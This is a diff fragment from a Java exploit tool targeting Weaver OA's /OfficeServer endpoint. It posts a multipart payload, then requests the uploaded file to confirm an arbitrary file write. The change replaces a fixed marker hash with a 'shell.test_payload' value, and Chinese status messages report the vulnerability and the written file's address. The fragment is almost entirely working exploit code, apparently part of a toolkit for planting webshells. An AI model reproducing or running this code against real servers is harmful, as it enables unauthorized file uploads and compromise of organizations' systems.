@@ -64,12 +64,12 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface{
                     "------WebKitFormBoundarymVk33liI64J7GQaK--";
 
             Response sec = HttpTools.post(url + "/OfficeServer", sec_post, this.headers, "utf-8");
-            if(sec.getCode() == 200 && sec.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
+            if(sec.getCode() == 200 && sec.getText().contains(shell.test_payload)){
 
                 textArea.appendText("\n 释放成功 检测写入状态");
                 Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
 
-                if(thired.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
+                if(thired.getText().contains(shell.test_payload)){
                     textArea.appendText("\n 漏洞存在，测试文件写入成功 地址为：" + url + "/" + filename);
                     return true;
                 }else {
